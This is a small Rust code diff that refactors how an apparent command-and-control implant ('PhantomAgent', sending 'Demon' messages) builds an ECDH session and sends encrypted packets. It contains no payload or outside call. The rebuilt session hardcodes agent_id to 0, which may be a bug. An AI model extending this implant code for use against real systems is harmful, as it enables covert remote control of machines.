@@ -89,14 +89,19 @@ impl PhantomAgent {
         &mut self,
         packages: Vec<DemonPackage>,
     ) -> Result<Vec<u8>, PhantomError> {
-        let session = self
+        let (connection_id, session_key) = self
             .ecdh_session
             .as_ref()
-            .ok_or(PhantomError::Transport("ECDH session not initialized".into()))?
-            .clone();
+            .ok_or_else(|| PhantomError::Transport("ECDH session not initialized".into()))
+            .map(|s| (s.connection_id, s.session_key))?;
         let payload = DemonMessage::new(packages)
             .to_bytes()
             .map_err(|e| PhantomError::Transport(format!("ECDH message encode: {e}")))?;
-        send_session_packet(&self.transport, &session, &payload).await
+        send_session_packet(
+            &self.transport,
+            &crate::ecdh::EcdhSession { connection_id, session_key, agent_id: 0 },
+            &payload,
+        )
+        .await
     }
 }
